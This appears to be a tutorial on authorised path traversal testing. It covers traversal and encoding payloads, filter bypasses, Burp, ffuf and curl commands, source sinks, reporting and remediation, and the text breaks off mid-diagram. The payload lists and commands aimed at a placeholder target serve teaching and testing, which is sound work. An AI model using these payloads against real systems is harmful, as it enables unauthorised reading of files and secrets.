# Path Traversal

Path Traversal, also known as Directory Traversal, occurs when attacker-controlled input is used to construct a filesystem path without sufficiently restricting which files or directories can be accessed.

A vulnerable application may allow a user to escape the intended directory and access files elsewhere on the filesystem.

Typical traversal sequences include:

```text
../
..\ 
```

The exact syntax depends on the operating system, application, framework and path normalisation behaviour.

!!! warning "Authorised Security Testing"
    Perform path traversal testing only against applications and systems for which you have explicit authorisation. Use minimally sensitive files for validation and stop once sufficient evidence has been obtained.

---

# Path Traversal Mental Model

Consider an application designed to retrieve files from:

```text
/var/www/files/
```

The application receives:

```text
filename=report.pdf
```

and constructs:

```text
/var/www/files/report.pdf
```

If the application simply concatenates user input:

```text
/var/www/files/ + USER_INPUT
```

an attacker may attempt:

```text
../../../etc/hostname
```

resulting conceptually in:

```text
/var/www/files/../../../etc/hostname
```

After filesystem path resolution:

```text
/etc/hostname
```

A useful model is:

```text
User-Controlled Input
        ↓
Application
        ↓
Path Construction
        ↓
Path Normalisation
        ↓
Filesystem API
        ↓
File / Directory
```

The central question is:

> Can attacker-controlled input cause the final resolved path to escape the directory that the application intended to expose?

---

# Path Traversal Testing Workflow

A structured workflow can look like:

```text
Map Application
      ↓
Identify File Functionality
      ↓
Identify Path-Like Parameters
      ↓
Establish Baseline
      ↓
Determine Operating System
      ↓
Test Basic Traversal
      ↓
Test Absolute Paths
      ↓
Understand Filtering
      ↓
Test Encoding / Normalisation
      ↓
Determine Accessible Files
      ↓
Confirm Minimal Impact
      ↓
Collect Evidence
      ↓
Report
```

Do not immediately send large traversal payload lists.

First understand how the application handles file paths.

---

# Where to Look for Path Traversal

Path traversal frequently appears in functionality involving files.

Interesting features include:

```text
File download
Document download
Image retrieval
Profile pictures
Invoice download
Report download
Log viewer
Export functionality
Import functionality
Backup download
Template loading
Language selection
Theme loading
Static resources
Attachments
File preview
PDF retrieval
Configuration files
Archive extraction
Media retrieval
```

Pay particular attention to endpoints where the application accepts something resembling a file name or path.

---

# Interesting Parameter Names

Common parameter names include:

```text
file
filename
filepath
path
document
doc
page
template
folder
directory
dir
image
img
download
attachment
resource
include
view
layout
theme
lang
language
locale
log
backup
export
report
name
```

Examples:

```text
/download?file=report.pdf
```

```text
/document?filename=invoice.pdf
```

```text
/image?path=avatars/user.png
```

```text
/view?page=help.html
```

```text
/api/files?name=document.pdf
```

Parameter names are clues rather than proof of vulnerability.

---

# File Download Endpoints

File download functionality should receive particular attention.

Example:

```http
GET /download?file=report.pdf HTTP/1.1
Host: target.example
```

The application may internally perform something conceptually similar to:

```text
BASE_DIRECTORY + filename
```

For example:

```text
/var/www/downloads/ + report.pdf
```

becomes:

```text
/var/www/downloads/report.pdf
```

The security question becomes:

```text
Can filename escape /var/www/downloads/?
```

---

# Establish a Baseline

Always begin with a legitimate request.

Example:

```http
GET /download?file=report.pdf HTTP/1.1
Host: target.example
```

Record:

```text
Status code
Content-Type
Content-Length
Response body
Content-Disposition
Response time
File contents
```

Then modify only the suspected path parameter.

---

# Determine the Operating System

Technology identification can help determine which filesystem syntax is relevant.

Linux and Unix-like systems commonly use:

```text
/
```

Windows commonly uses:

```text
\
```

although many Windows APIs also accept:

```text
/
```

Potential clues include:

```text
Error messages
Stack traces
Server headers
Framework
File paths
Source code
Default files
Application behaviour
```

Example Linux paths:

```text
/etc/
/var/
/home/
/opt/
/tmp/
/proc/
```

Example Windows paths:

```text
C:\Windows\
C:\Users\
C:\Program Files\
C:\ProgramData\
```

---

# Basic Linux Path Traversal

A basic Linux traversal test may look like:

```text
../../../etc/hostname
```

Example request:

```http
GET /download?file=../../../etc/hostname HTTP/1.1
Host: target.example
```

If the application prepends:

```text
/var/www/files/
```

the resulting path becomes:

```text
/var/www/files/../../../etc/hostname
```

which may resolve to:

```text
/etc/hostname
```

---

# Choosing a Linux Validation File

Prefer minimally sensitive files.

Useful candidates include:

```text
/etc/hostname
/etc/os-release
```

Another commonly used proof is:

```text
/etc/passwd
```

but `/etc/hostname` or `/etc/os-release` may provide sufficient evidence without exposing account information.

The objective is to demonstrate arbitrary filesystem access, not to collect sensitive data.

---

# Basic Windows Path Traversal

A Windows traversal test may look like:

```text
..\..\..\Windows\win.ini
```

Example:

```http
GET /download?file=..\..\..\Windows\win.ini HTTP/1.1
Host: target.example
```

A useful minimally sensitive Windows validation target is:

```text
C:\Windows\win.ini
```

---

# Forward Slashes on Windows

Do not assume Windows requires backslashes.

Many Windows APIs understand:

```text
../../Windows/win.ini
```

as well as:

```text
..\..\Windows\win.ini
```

Therefore, test path handling based on actual application behaviour rather than operating system assumptions alone.

---

# Absolute Paths

Sometimes traversal sequences are unnecessary because the application accepts absolute paths.

Linux example:

```text
/etc/hostname
```

Windows example:

```text
C:\Windows\win.ini
```

Conceptually:

```text
file=/etc/hostname
```

or:

```text
file=C:\Windows\win.ini
```

may be interpreted directly by an unsafe filesystem API.

---

# Relative vs Absolute Path Testing

A useful sequence is:

```text
Normal File
    ↓
Relative Traversal
    ↓
Absolute Path
    ↓
Encoded Traversal
    ↓
Normalisation Analysis
```

For example:

```text
report.pdf
```

then:

```text
../report.pdf
```

then:

```text
../../some-file
```

then an absolute path if relevant.

This helps identify how the application constructs paths.

---

# Determine Traversal Depth

If the application uses an unknown base directory, the number of traversal sequences required may not be obvious.

Conceptually:

```text
../
../../
../../../
../../../../
../../../../../
```

Instead of guessing indefinitely, observe application responses.

Look for differences in:

```text
Status
Length
Error message
Content-Type
Response body
```

---

# Excess Traversal Sequences

On many filesystems, additional traversal sequences beyond the root do not necessarily prevent the path from resolving.

For example:

```text
../../../../../../etc/hostname
```

may still resolve to:

```text
/etc/hostname
```

depending on the application and filesystem API.

This can make extra traversal depth useful when the base directory is unknown.

---

# Path Normalisation

Applications may normalise paths before accessing them.

For example:

```text
/images/../config/file
```

may become:

```text
/config/file
```

Different components may perform normalisation:

```text
Reverse proxy
Web server
Framework
Application
Filesystem API
Operating system
```

The value visible in Burp may therefore not be identical to the path eventually processed by the filesystem.

---

# URL Encoding

Traversal sequences may be URL encoded.

For example:

```text
../
```

can become:

```text
%2e%2e%2f
```

or:

```text
..%2f
```

A backslash may appear as:

```text
%5c
```

Examples:

```text
%2e%2e%2fetc%2fhostname
```

```text
..%2f..%2f..%2fetc%2fhostname
```

The relevant question is:

> At which layer is URL decoding performed?

---

# Double Encoding

Applications with multiple decoding layers may interpret double-encoded traversal sequences differently.

Conceptually:

```text
../
```

becomes:

```text
%2e%2e%2f
```

and the percent characters can themselves be encoded.

This produces values such as:

```text
%252e%252e%252f
```

Processing might occur as:

```text
%252e%252e%252f
        ↓
%2e%2e%2f
        ↓
../
```

This matters when one security layer validates the value before another layer performs additional decoding.

---

# Mixed Encoding

Different parts of the traversal sequence may be encoded independently.

Examples:

```text
..%2f
%2e%2e/
.%2e/
%2e./
```

The purpose of testing these variations is to understand normalisation and decoding behaviour, not simply to generate a large payload list.

---

# Mixed Path Separators

Applications may process combinations such as:

```text
../
..\
```

or mixed forms:

```text
../..\
```

This is particularly relevant when:

```text
Application framework
```

and:

```text
Operating system
```

perform path handling differently.

---

# Nested Traversal Sequences

Some filters remove literal traversal sequences once.

For example, an application might perform:

```text
replace("../", "")
```

A nested sequence may become meaningful after that replacement.

Conceptually:

```text
....//
```

contains an overlapping traversal structure.

If the filter removes part of the value, the remaining string may become:

```text
../
```

This is why security controls should normalise and validate paths rather than attempting simple string replacement.

---

# Path Traversal Filters

Common weak protections include:

```text
Remove ../
Remove ..\
Block the word passwd
Block absolute paths
Require a file extension
Check string prefix
URL encode dangerous characters
```

These protections should be analysed individually.

The key question is:

```text
What exact transformation occurs?
```

---

# Required Base Directory

Some applications require the path to begin with a particular directory.

For example:

```text
/var/www/images/
```

A request might normally contain:

```text
filename=/var/www/images/photo.jpg
```

Testing may reveal whether traversal is processed after the required prefix.

Conceptually:

```text
/var/www/images/../../../etc/hostname
```

The important factor is the final resolved path.

---

# Required File Extension

Applications sometimes append a file extension automatically.

For example:

```text
USER_INPUT + ".pdf"
```

A request for:

```text
report
```

becomes:

```text
report.pdf
```

This can influence path traversal testing.

Determine:

```text
Is the extension appended?
Is it validated before or after decoding?
Does the filesystem API receive the appended value?
```

---

# Null Byte Considerations

Historically, some applications and native APIs were vulnerable to null byte termination.

A value conceptually containing:

```text
%00
```

could cause one component to see:

```text
../../../etc/passwd
```

while another expected:

```text
../../../etc/passwd.pdf
```

Modern languages and frameworks generally handle this more safely.

Treat null byte behaviour as technology-specific rather than assuming it works universally.

---

# File Download APIs

Modern applications frequently expose download functionality through APIs.

Example:

```http
GET /api/documents/download?filename=report.pdf HTTP/1.1
Host: target.example
Authorization: Bearer ...
```

Interesting API properties include:

```text
filename
path
document
resource
object
key
location
```

Send the request to Burp Repeater and determine how the backend interprets the value.

---

# JSON Path Traversal

Paths may also be supplied in JSON.

Example:

```http
POST /api/download HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "filename": "report.pdf"
}
```

Testing then focuses on:

```text
filename
```

rather than the URL.

Potential path-like JSON properties include:

```text
file
filename
path
template
document
resource
directory
```

---

# POST Body Path Traversal

Do not restrict path traversal testing to GET parameters.

Example:

```http
POST /download HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

file=report.pdf
```

The vulnerability depends on how the server uses the value, not where the parameter appears.

---

# Path Traversal in Cookies

Occasionally cookies control resources such as:

```text
Language
Theme
Template
Layout
```

Example:

```http
Cookie: language=en
```

If the server maps the value to a filesystem resource, it may become path traversal relevant.

---

# Language Parameters

Language functionality is historically interesting.

Examples:

```text
?lang=en
```

```text
?language=en_US
```

```text
?locale=nl_NL
```

The application might internally load:

```text
/languages/en.php
```

or:

```text
/locales/en.json
```

Determine whether user input can escape the intended language directory.

---

# Template Parameters

Template selection can also expose filesystem paths.

Example:

```text
?template=invoice
```

might cause:

```text
/templates/invoice.html
```

to be loaded.

Potential issues include:

```text
Path traversal
Local file inclusion
Template injection
```

depending on how the file is subsequently processed.

---

# File Names

User-controlled file names should also be considered.

Potential flow:

```text
Upload File
    ↓
Store File Name
    ↓
Later Download
    ↓
Construct Filesystem Path
```

The vulnerability may therefore exist in the download functionality rather than the original upload endpoint.

---

# Upload and Download Workflows

A useful workflow is:

```text
Upload File
    ↓
Observe Stored Name
    ↓
Retrieve File
    ↓
Capture Download Request
    ↓
Identify File Parameter
    ↓
Test Path Handling
```

Burp HTTP history is particularly useful here.

---

# File IDs vs File Names

Secure applications often expose an opaque identifier:

```text
/download?id=8291
```

rather than:

```text
/download?file=/var/www/files/report.pdf
```

However, IDs do not automatically make the application secure.

The server must still perform appropriate authorisation when mapping:

```text
ID → File
```

This overlaps with IDOR and broken access control testing.

---

# Path Traversal vs IDOR

These are different vulnerability classes.

Path traversal:

```text
Attacker Controls Path
       ↓
Escapes Intended Directory
       ↓
Reads Different Filesystem Resource
```

IDOR:

```text
Attacker Controls Object Identifier
       ↓
Application Retrieves Another Object
       ↓
Missing Authorisation
```

Example:

```text
/download?id=123
```

changing to:

```text
/download?id=124
```

is more likely an authorisation test.

Changing:

```text
file=report.pdf
```

to:

```text
file=../../../etc/hostname
```

is path traversal testing.

---

# Path Traversal vs Local File Inclusion

Path Traversal and Local File Inclusion are related but not identical.

Path traversal usually means:

```text
Attacker-Controlled Path
       ↓
Filesystem Access
       ↓
File Read / Write
```

LFI usually means:

```text
Attacker-Controlled Path
       ↓
Application Includes File
       ↓
Interpreter / Template Engine Processes It
```

For example:

```text
download?file=../../../etc/hostname
```

returning file bytes is primarily path traversal.

Whereas:

```text
?page=../../../some-file
```

being included by an interpreter may represent LFI.

---

# Path Traversal vs Arbitrary File Read

A successful path traversal often results in:

```text
Arbitrary File Read
```

but the terms describe different aspects.

```text
Path Traversal
```

describes the technique or root cause.

```text
Arbitrary File Read
```

describes the resulting capability.

A report title might therefore be:

```text
Path Traversal Allows Arbitrary File Read
```

---

# Path Traversal vs Arbitrary File Write

Path traversal can also occur in write operations.

Conceptually:

```text
User-Controlled File Name
        ↓
Application Constructs Path
        ↓
Traversal
        ↓
File Written Outside Intended Directory
```

Examples may involve:

```text
Uploads
Exports
Backups
Archive extraction
Generated reports
Log files
```

Arbitrary file write can have substantially greater impact than file read.

Do not perform writes to sensitive locations unless explicitly authorised and necessary.

---

# Zip Slip

Archive extraction introduces a related vulnerability known as:

```text
Zip Slip
```

An archive may contain entries such as:

```text
../../some-file
```

If the extraction process fails to validate the final path:

```text
Archive
   ↓
Extract
   ↓
Traversal Entry
   ↓
Write Outside Extraction Directory
```

This is path traversal during archive extraction.

---

# Archive Formats

Potentially relevant archive formats include:

```text
ZIP
TAR
TAR.GZ
JAR
WAR
EAR
```

The exact behaviour depends on the archive library.

Archive extraction should ensure every extracted path remains inside the intended destination directory.

---

# Burp Suite Workflow

Burp Suite provides an excellent manual path traversal workflow.

```text
Proxy
  ↓
HTTP History
  ↓
Find File Function
  ↓
Send to Repeater
  ↓
Establish Baseline
  ↓
Modify File Parameter
  ↓
Test Traversal
  ↓
Compare Response
  ↓
Confirm Minimal File Read
```

---

# Burp Repeater

Repeater should be the primary tool for manual validation.

Example workflow:

```text
1. Capture legitimate file request

2. Send request to Repeater

3. Record baseline response

4. Modify suspected path parameter

5. Test one traversal sequence

6. Increase depth if required

7. Test absolute path if relevant

8. Analyse encoding if filtering occurs

9. Confirm with harmless target file

10. Save evidence
```

---

# Burp Intruder

Intruder can help test a controlled set of path variations.

Example request:

```http
GET /download?file=§report.pdf§ HTTP/1.1
Host: target.example
```

A focused payload list could contain variations relevant to the identified operating system and application behaviour.

Analyse:

```text
Status
Length
Words
Lines
Content-Type
```

Interesting outliers should be investigated manually in Repeater.

---

# Example Linux Intruder Candidates

A small controlled list might contain:

```text
../etc/hostname
../../etc/hostname
../../../etc/hostname
../../../../etc/hostname
../../../../../etc/hostname
/etc/hostname
```

If encoding appears relevant, investigate it separately rather than immediately multiplying every payload.

---

# Example Windows Intruder Candidates

For a Windows target:

```text
..\Windows\win.ini
..\..\Windows\win.ini
..\..\..\Windows\win.ini
..\..\..\..\Windows\win.ini
C:\Windows\win.ini
```

Adjust testing to the actual target environment.

---

# ffuf

`ffuf` can help with targeted traversal testing when you already understand the vulnerable request structure.

Project:

https://github.com/ffuf/ffuf

For example, an authorised lab request might conceptually be tested with:

```bash
ffuf \
  -u 'https://target.example/download?file=FUZZ' \
  -w traversal.txt
```

Filter results based on the baseline.

Useful options include:

```text
-fs
-fw
-fl
-fc
```

For example:

```bash
ffuf \
  -u 'https://target.example/download?file=FUZZ' \
  -w traversal.txt \
  -fc 404
```

Do not use enormous generic payload lists against production applications.

---

# curl

`curl` is useful for reproducing path traversal requests outside Burp.

Example:

```bash
curl -i \
  'https://target.example/download?file=../../../etc/hostname'
```

For authenticated applications:

```bash
curl -i \
  -H 'Cookie: session=YOUR_SESSION' \
  'https://target.example/download?file=../../../etc/hostname'
```

Avoid putting real session values in documentation or source repositories.

---

# DotDotPwn

DotDotPwn is a specialised directory traversal testing tool.

Project:

```text
https://github.com/wireghoul/dotdotpwn
```

It can be useful for targeted testing after manual analysis has identified a likely path traversal location.

The preferred methodology remains:

```text
Manual Discovery
      ↓
Understand Parameter
      ↓
Manual Traversal Testing
      ↓
Targeted Automation
      ↓
Manual Verification
```

Do not report findings solely from automated tool output.

---

# Payload Collections

Payload collections can help when a specific filtering or normalisation behaviour has been identified.

Useful references include:

```text
PayloadsAllTheThings
HackTricks
PortSwigger Web Security Academy
OWASP WSTG
```

The correct sequence is:

```text
Understand Application
       ↓
Understand Filter
       ↓
Select Relevant Payload
```

rather than:

```text
Send Thousands of Payloads
       ↓
Hope Something Works
```

---

# Response Analysis

When testing traversal, compare:

```text
Status
Content-Length
Content-Type
Response body
Content-Disposition
Response time
Application error
```

For example:

```text
Normal file
200
application/pdf
124 KB
```

versus:

```text
Traversal test
200
text/plain
18 bytes
```

Such differences deserve manual investigation.

---

# Error Messages

Errors can reveal useful path information.

Examples:

```text
File not found
No such file or directory
Access denied
Permission denied
Invalid path
Path outside allowed directory
Cannot open file
```

Verbose errors may expose the application's base directory.

For example:

```text
FileNotFoundException:
/opt/application/uploads/test.pdf
```

reveals:

```text
/opt/application/uploads/
```

This can help determine traversal depth.

---

# Absolute Path Disclosure

Application errors may reveal absolute filesystem paths.

Examples:

```text
/var/www/application/uploads/
```

```text
/opt/app/data/
```

```text
C:\inetpub\wwwroot\uploads\
```

Path disclosure alone may be a lower-severity issue, but it can significantly assist traversal testing.

---

# WAF Behaviour

A WAF may block common traversal sequences.

Indicators include:

```text
403
406
Generic block page
Connection reset
Different server header
Request rejected before application
```

Separate:

```text
WAF Behaviour
```

from:

```text
Application Path Validation
```

A WAF blocking:

```text
../
```

does not demonstrate that the underlying application handles paths securely.

---

# Reverse Proxy Normalisation

Reverse proxies and web servers may normalise paths before forwarding requests.

The request flow can be:

```text
Browser
   ↓
CDN
   ↓
WAF
   ↓
Reverse Proxy
   ↓
Web Server
   ↓
Framework
   ↓
Application
```

Each layer may perform:

```text
URL decoding
Path normalisation
Slash collapsing
Character filtering
```

This can explain differences between seemingly equivalent traversal tests.

---

# Path Traversal in REST APIs

REST-style paths can contain attacker-controlled segments.

Example:

```text
/api/files/report.pdf
```

The route may internally map:

```text
report.pdf
```

to a filesystem path.

Path traversal testing therefore should not focus only on query parameters.

Potential locations include:

```text
/api/files/{filename}
/documents/{path}
/download/{resource}
```

---

# URL Path Traversal

A traversal sequence may appear directly in the URL path:

```text
/files/../../../some-resource
```

However, browsers, proxies and servers may normalise these sequences automatically.

Burp Repeater is useful because it gives greater control over the exact request sent.

---

# JavaScript Analysis

Client-side JavaScript can reveal hidden file functionality.

Search JavaScript for terms such as:

```text
download
file
filename
path
document
attachment
export
report
template
```

For example:

```javascript
fetch("/api/download?file=" + filename)
```

reveals a potentially interesting endpoint even if it is not obvious in the user interface.

---

# API Documentation

Review:

```text
Swagger
OpenAPI
GraphQL schema
Developer documentation
JavaScript API clients
Mobile application APIs
```

for parameters such as:

```text
file
path
filename
resource
template
document
```

These may expose functionality not reachable through normal navigation.

---

# Source Code Review

When source code is available, search for filesystem APIs.

The general flow is:

```text
SOURCE
  ↓
Request Parameter
  ↓
Path Construction
  ↓
Normalisation
  ↓
Filesystem API
  ↓
FILE
```

The goal is to trace attacker-controlled data to filesystem operations.

---

# Python File Sinks

Interesting Python functionality includes:

```python
open()
pathlib.Path()
os.path.join()
os.path.abspath()
os.path.realpath()
send_file()
send_from_directory()
```

Example potentially unsafe pattern:

```python
filename = request.args.get("file")

path = "/var/www/files/" + filename

return open(path, "rb").read()
```

---

# Python Path Joining

Do not assume:

```python
os.path.join()
```

automatically prevents traversal.

For example:

```python
os.path.join(BASE, user_input)
```

constructs a path but does not inherently prove that the resolved result remains inside `BASE`.

The application must validate the final resolved path.

---

# PHP File Sinks

Interesting PHP functions include:

```php
file_get_contents()
readfile()
fopen()
include()
require()
include_once()
require_once()
```

Example:

```php
$file = $_GET["file"];
readfile("/var/www/files/" . $file);
```

Functions such as:

```text
include
require
```

may introduce LFI behaviour rather than simple file disclosure.

---

# Java File Sinks

Interesting Java APIs include:

```text
File
FileInputStream
Files.readAllBytes
Files.readString
Paths.get
Path.resolve
Resource
ClassPathResource
FileSystemResource
```

Example:

```java
Path path = Paths.get(baseDir, filename);
```

Review whether the final canonical or normalised path is verified to remain within the expected directory.

---

# .NET File Sinks

Interesting .NET APIs include:

```text
File.ReadAllText
File.ReadAllBytes
File.Open
FileStream
Path.Combine
Directory.GetFiles
PhysicalFile
```

Do not assume:

```text
Path.Combine
```

alone prevents traversal.

Validate the final canonical path.

---

# Node.js File Sinks

Interesting Node.js functionality includes:

```javascript
fs.readFile()
fs.readFileSync()
fs.createReadStream()
path.join()
path.resolve()
res.sendFile()
```

Example:

```javascript
const file = req.query.file;

fs.readFile("/app/files/" + file, callback);
```

Trace the request value into the filesystem operation.

---

# Go File Sinks

Interesting Go functions include:

```go
os.Open()
os.ReadFile()
filepath.Join()
filepath.Clean()
http.ServeFile()
```

Review whether cleaned and resolved paths remain inside the intended directory.

---

# Ruby File Sinks

Interesting Ruby functionality includes:

```text
File.read
File.open
File.join
send_file
IO.read
```

Trace attacker-controlled path components to the filesystem operation.

---

# Search Source Code for File Sinks

A useful first pass with `grep`:

```bash
grep -RniE \
'open\(|readfile|file_get_contents|fopen|include\(|require\(|FileInputStream|Files\.read|Paths\.get|File\.Read|File\.Open|FileStream|fs\.readFile|fs\.createReadStream|sendFile|os\.Open|os\.ReadFile|filepath\.Join|File\.read|send_file' \
.
```

With `ripgrep`:

```bash
rg -n \
'open\(|readfile|file_get_contents|fopen|include\(|require\(|FileInputStream|Files\.read|Paths\.get|File\.Read|File\.Open|FileStream|fs\.readFile|fs\.createReadStream|sendFile|os\.Open|os\.ReadFile|filepath\.Join|File\.read|send_file'
```

Search results are potential sinks.

You still need to trace user input.

---

# Source to Sink Analysis

A useful model is:

```text
SOURCE
  ↓
req.query.file
  ↓
Controller
  ↓
Path Construction
  ↓
Path Normalisation
  ↓
Filesystem API
  ↓
FILE
```

Example:

```text
req.query.filename
       ↓
downloadFile()
       ↓
path.join(uploadDir, filename)
       ↓
fs.createReadStream()
```

Then ask:

```text
Is filename validated?

Is the final path normalised?

Is the canonical path checked?

Can it escape uploadDir?
```

---

# Secure Path Validation

A safer design is conceptually:

```text
User Input
    ↓
Resolve Against Base Directory
    ↓
Canonicalise
    ↓
Verify Result Remains Inside Base
    ↓
Access File
```

For example:

```text
BASE:
/var/www/files/

INPUT:
reports/report.pdf

RESOLVED:
/var/www/files/reports/report.pdf
```

The application should verify that the final path remains beneath:

```text
/var/www/files/
```

---

# Prefix Validation

Be careful with naive string prefix checks.

Suppose the permitted directory is:

```text
/var/www/files
```

A path such as:

```text
/var/www/files-backup/
```

also begins with the string:

```text
/var/www/files
```

Path validation should operate on properly resolved filesystem paths and directory boundaries.

---

# Prefer Indirect References

Where possible, avoid exposing filesystem paths to users.

Instead of:

```text
/download?file=/var/www/reports/report.pdf
```

prefer something like:

```text
/download?id=8f6c1e
```

The server then maps:

```text
8f6c1e
```

to an approved file.

Authorisation must still be performed.

---

# File Allowlist

If only a small number of files can be downloaded, maintain an explicit mapping.

Conceptually:

```text
report-2026
      ↓
Approved Mapping
      ↓
/srv/reports/report-2026.pdf
```

rather than allowing arbitrary user-controlled paths.

---

# Least Privilege

Filesystem permissions provide important defence in depth.

The application process should not have unnecessary access to:

```text
Operating system secrets
SSH keys
Application secrets
Other users' files
Backup files
Cloud credentials
Private configuration
```

Path traversal should still be fixed at the application layer, but least privilege reduces its impact.

---

# Path Traversal Validation

A strong finding should establish:

```text
ATTACKER INPUT
      ↓
PATH CONSTRUCTION
      ↓
DIRECTORY ESCAPE
      ↓
UNINTENDED FILE
      ↓
FILE CONTENT RETURNED
```

For example:

```text
filename
   ↓
/srv/downloads/ + filename
   ↓
../../../etc/hostname
   ↓
/etc/hostname
   ↓
Contents returned
```

---

# Avoid Excessive File Access

Once arbitrary file access has been demonstrated, avoid unnecessary enumeration.

You generally do not need to retrieve:

```text
SSH private keys
Database passwords
Cloud credentials
Password hashes
Application secrets
User documents
```

to prove the vulnerability.

Use:

```text
/etc/hostname
```

or:

```text
C:\Windows\win.ini
```

where sufficient.

---

# Evidence Collection

Useful evidence includes:

```text
Affected endpoint
HTTP method
Affected parameter
Authentication requirement
Original request
Traversal request
Normal response
Traversal response
File retrieved
Operating system
Required traversal depth
Encoding required if applicable
Relevant screenshot
```

Avoid placing unnecessary sensitive file contents into reports.

---

# Path Traversal Reporting

A report should explain:

```text
Which endpoint is affected
Which parameter controls the path
What directory should normally be accessible
How traversal escapes that directory
Which harmless file demonstrated the issue
What files the application account could potentially access
What security impact exists
How the issue should be remediated
```

---

# Example Finding Structure

```text
Title
Path Traversal Allows Arbitrary File Read

Affected Endpoint
GET /api/documents/download

Affected Parameter
filename

Authentication Required
Yes

Description
The application uses the user-controlled filename parameter when
constructing a filesystem path without ensuring that the final
resolved path remains within the intended document directory.

By supplying directory traversal sequences, it was possible to
escape the document directory and retrieve a file elsewhere on
the server filesystem.

Validation
The vulnerability was demonstrated using a non-sensitive
operating system file.

Impact
An attacker with access to the affected functionality may be able
to read files accessible to the application service account.

Depending on filesystem permissions, this could expose application
configuration, source code or other sensitive information.

Recommendation
Resolve requested files against a fixed base directory and verify
that the canonical resulting path remains within that directory
before performing the filesystem operation.

Where possible, use indirect file identifiers rather than accepting
filesystem paths from users.
```

---

# Remediation

A secure implementation should avoid directly trusting user-controlled filesystem paths.

Recommended controls include:

```text
Use fixed base directories
Canonicalise paths
Validate final resolved path
Use indirect file identifiers
Use file allowlists where possible
Reject unexpected path separators
Apply least privilege
Avoid exposing absolute paths
Perform authorisation independently
```

---

# Do Not Rely on String Replacement

Avoid protections such as:

```text
filename.replace("../", "")
```

or:

```text
if "../" not in filename
```

These approaches can fail because of:

```text
Encoding
Multiple decoding layers
Alternative separators
Nested sequences
Path normalisation
Operating system differences
```

Validate the final resolved filesystem path instead.

---

# Path Traversal Testing Checklist

## Discovery

- [ ] File downloads
- [ ] Document downloads
- [ ] Image retrieval
- [ ] Attachments
- [ ] Reports
- [ ] Exports
- [ ] Imports
- [ ] Log viewers
- [ ] Templates
- [ ] Language files
- [ ] Themes
- [ ] Backups
- [ ] File previews
- [ ] Archive extraction
- [ ] APIs handling file paths

## Parameters

- [ ] file
- [ ] filename
- [ ] filepath
- [ ] path
- [ ] document
- [ ] page
- [ ] template
- [ ] directory
- [ ] image
- [ ] attachment
- [ ] resource
- [ ] lang
- [ ] locale
- [ ] report
- [ ] backup

## Baseline

- [ ] Capture valid request
- [ ] Record status
- [ ] Record length
- [ ] Record Content-Type
- [ ] Record Content-Disposition
- [ ] Record normal file content

## Linux

- [ ] Test relative traversal
- [ ] Test additional depth
- [ ] Test absolute path
- [ ] Use minimally sensitive file
- [ ] Consider `/etc/hostname`
- [ ] Consider `/etc/os-release`

## Windows

- [ ] Test `..\`
- [ ] Test `../`
- [ ] Test additional depth
- [ ] Test absolute path
- [ ] Consider `C:\Windows\win.ini`

## Encoding

- [ ] URL encoding
- [ ] Partial encoding
- [ ] Double encoding where relevant
- [ ] Mixed separators
- [ ] Determine decoding layers
- [ ] Determine path normalisation

## Filtering

- [ ] Determine whether `../` is removed
- [ ] Determine whether `..\` is removed
- [ ] Test nested traversal if justified
- [ ] Determine whether absolute paths are blocked
- [ ] Determine whether extension is appended
- [ ] Determine whether prefix is required

## File Workflows

- [ ] Upload then download
- [ ] File preview
- [ ] Attachment retrieval
- [ ] Export retrieval
- [ ] Report generation
- [ ] Archive extraction
- [ ] File ID mapping

## Burp

- [ ] Proxy
- [ ] HTTP History
- [ ] Repeater
- [ ] Intruder where useful
- [ ] Compare responses
- [ ] Preserve original request

## Automation

- [ ] Understand parameter manually
- [ ] Use small targeted payload lists
- [ ] ffuf where useful
- [ ] DotDotPwn where useful
- [ ] Review automated results
- [ ] Manually reproduce

## Source Review

- [ ] Search filesystem APIs
- [ ] Identify user-controlled paths
- [ ] Trace source to sink
- [ ] Review path joining
- [ ] Review canonicalisation
- [ ] Review base directory validation
- [ ] Review file authorisation
- [ ] Review archive extraction

## Validation

- [ ] Confirm directory escape
- [ ] Confirm unintended file access
- [ ] Confirm repeatability
- [ ] Use minimal proof
- [ ] Avoid unnecessary sensitive files
- [ ] Capture request and response
- [ ] Stop after sufficient evidence

---

# Useful Tools

| Tool | Purpose |
|---|---|
| Burp Suite | Request interception and path traversal testing |
| Burp Repeater | Manual traversal validation |
| Burp Intruder | Controlled traversal payload testing |
| ffuf | Targeted automated path payload testing |
| DotDotPwn | Directory traversal testing |
| curl | Manual request reproduction |
| Browser DevTools | Discover file and API functionality |
| grep | Filesystem sink discovery |
| ripgrep | Fast source code searching |
| Semgrep | Structured source code analysis |

---

# Tool Selection

| Situation | Tool |
|---|---|
| Understand file request | Burp Proxy |
| Manual traversal | Burp Repeater |
| Compare traversal depths | Burp Intruder |
| Targeted payload fuzzing | ffuf |
| Traversal-specific automation | DotDotPwn |
| HTTP reproduction | curl |
| Source sink discovery | grep / ripgrep |
| Structured source analysis | Semgrep |

---

# Quick Reference

```text
High Value Functionality:

Downloads
Documents
Images
Attachments
Reports
Exports
Backups
Templates
Languages
Logs
Archives

Interesting Parameters:

file
filename
filepath
path
document
page
template
directory
resource
attachment
lang
locale
report

Linux:

../
../../
../../../

Minimal validation:

/etc/hostname
/etc/os-release

Windows:

..\
..\..\
..\..\..\

Minimal validation:

C:\Windows\win.ini

Encoding:

../
..%2f
%2e%2e%2f
%252e%252e%252f

Manual:

Burp Repeater

Automation:

Burp Intruder
ffuf
DotDotPwn

Always establish:

INPUT → PATH CONSTRUCTION → DIRECTORY ESCAPE → FILE ACCESS → IMPACT
```

---

# Practical Workflow Summary

```text
                  ┌───────────────────────┐
                  │ Find File Function    │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Identify Parameter    │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Establish Baseline    │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Determine OS / Paths  │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Basic Traversal       │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Absolute Path Test    │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Filtering Present?    │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Encoding / Normalise  │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Confirm Harmless File │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
